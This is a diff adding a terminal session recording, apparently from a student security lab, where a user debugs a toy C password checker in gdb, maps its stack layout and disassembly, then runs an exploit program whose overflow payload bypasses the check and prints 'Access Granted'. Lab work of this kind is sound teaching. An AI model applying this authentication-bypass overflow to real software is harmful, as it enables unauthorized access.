@@ -1,0 +1,114 @@
+Script started on Mon 09 Mar 2026 10:24:47 PM PDT
+]0;joshua@UbuntuNew: ~/lab2-skeleton-code-8joshua@UbuntuNew:~/lab2-skeleton-code-8$ ./4[Kt4 wrongpassword
+arg: wrongpassword
+checking auth return
+
+Access Denied.
+]0;joshua@UbuntuNew: ~/lab2-skeleton-code-8joshua@UbuntuNew:~/lab2-skeleton-code-8$ ./t4 realpassword
+arg: realpassword
+checking auth return
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-
+ Access Granted.
+-=-=-=-=-=-=-=-=-=-=-=-=-=-
+]0;joshua@UbuntuNew: ~/lab2-skeleton-code-8joshua@UbuntuNew:~/lab2-skeleton-code-8$ gdb ./t4
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./t4...done.
+(gdb) break check_authentication
+Breakpoint 1 at 0x80484e3: file task4.c, line 6.
+(gdb) run AAAA
+Starting program: /home/joshua/lab2-skeleton-code-8/t4 AAAA
+arg: AAAA
+
+Breakpoint 1, check_authentication (password=0xbffff36c "AAAA") at task4.c:6
+6	    int auth_flag = 0;
+(gdb) info frame
+Stack level 0, frame at 0xbffff0b0:
+ eip = 0x80484e3 in check_authentication (task4.c:6); saved eip = 0x804857f
+ called by frame at 0xbffff0e0
+ source language c.
+ Arglist at 0xbffff0a8, args: password=0xbffff36c "AAAA"
+ Locals at 0xbffff0a8, Previous frame's sp is 0xbffff0b0
+ Saved registers:
+  ebp at 0xbffff0a8, eip at 0xbffff0ac
+(gdb) print &password_buffer
+$1 = (char (*)[16]) 0xbffff08c
+(gdb) &[Kp &auth_flag
+$2 = (int *) 0xbffff09c
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804851f <+0>:	push   %ebp
+   0x08048520 <+1>:	mov    %esp,%ebp
+   0x08048522 <+3>:	and    $0xfffffff0,%esp
+   0x08048525 <+6>:	sub    $0x20,%esp
+   0x08048528 <+9>:	movl   $0x0,0x1c(%esp)
+   0x08048530 <+17>:	cmpl   $0x1,0x8(%ebp)
+   0x08048534 <+21>:	jg     0x8048557 <main+56>
+   0x08048536 <+23>:	mov    0xc(%ebp),%eax
+   0x08048539 <+26>:	mov    (%eax),%eax
+   0x0804853b <+28>:	mov    %eax,0x4(%esp)
+   0x0804853f <+32>:	movl   $0x804867d,(%esp)
+   0x08048546 <+39>:	call   0x8048380 <printf@plt>
+   0x0804854b <+44>:	movl   $0x0,(%esp)
+   0x08048552 <+51>:	call   0x80483c0 <exit@plt>
+   0x08048557 <+56>:	mov    0xc(%ebp),%eax
+   0x0804855a <+59>:	add    $0x4,%eax
+   0x0804855d <+62>:	mov    (%eax),%eax
+   0x0804855f <+64>:	mov    %eax,0x4(%esp)
+   0x08048563 <+68>:	movl   $0x8048693,(%esp)
+   0x0804856a <+75>:	call   0x8048380 <printf@plt>
+   0x0804856f <+80>:	mov    0xc(%ebp),%eax
+   0x08048572 <+83>:	add    $0x4,%eax
+---Type <return> to continue, or q <return> to quit---
+   0x08048575 <+86>:	mov    (%eax),%eax
+   0x08048577 <+88>:	mov    %eax,(%esp)
+   0x0804857a <+91>:	call   0x80484dd <check_authentication>
+   0x0804857f <+96>:	mov    %eax,0x1c(%esp)
+   0x08048583 <+100>:	movl   $0x804869c,(%esp)
+   0x0804858a <+107>:	call   0x80483a0 <puts@plt>
+   0x0804858f <+112>:	cmpl   $0x0,0x1c(%esp)
+   0x08048594 <+117>:	jne    0x80485a9 <main+138>
+   0x08048596 <+119>:	movl   $0x80486b1,(%esp)
+   0x0804859d <+126>:	call   0x80483a0 <puts@plt>
+   0x080485a2 <+131>:	mov    $0x0,%eax
+   0x080485a7 <+136>:	jmp    0x80485d2 <main+179>
+   0x080485a9 <+138>:	movl   $0x80486c1,(%esp)
+   0x080485b0 <+145>:	call   0x80483a0 <puts@plt>
+   0x080485b5 <+150>:	movl   $0x80486de,(%esp)
+   0x080485bc <+157>:	call   0x80483a0 <puts@plt>
+   0x080485c1 <+162>:	movl   $0x80486ef,(%esp)
+   0x080485c8 <+169>:	call   0x80483a0 <puts@plt>
+   0x080485cd <+174>:	mov    $0x0,%eax
+   0x080485d2 <+179>:	leave  
+   0x080485d3 <+180>:	ret    
+End of assembler dump.
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 2680] will be killed.
+
+Quit anyway? (y or n) y
+]0;joshua@UbuntuNew: ~/lab2-skeleton-code-8joshua@UbuntuNew:~/lab2-skeleton-code-8$ ./exploit
+arg: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA©…
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-
+ Access Granted.
+-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Segmentation fault (core dumped)
+]0;joshua@UbuntuNew: ~/lab2-skeleton-code-8joshua@UbuntuNew:~/lab2-skeleton-code-8$ exit
+exit
+
+Script done on Mon 09 Mar 2026 10:26:17 PM PDT
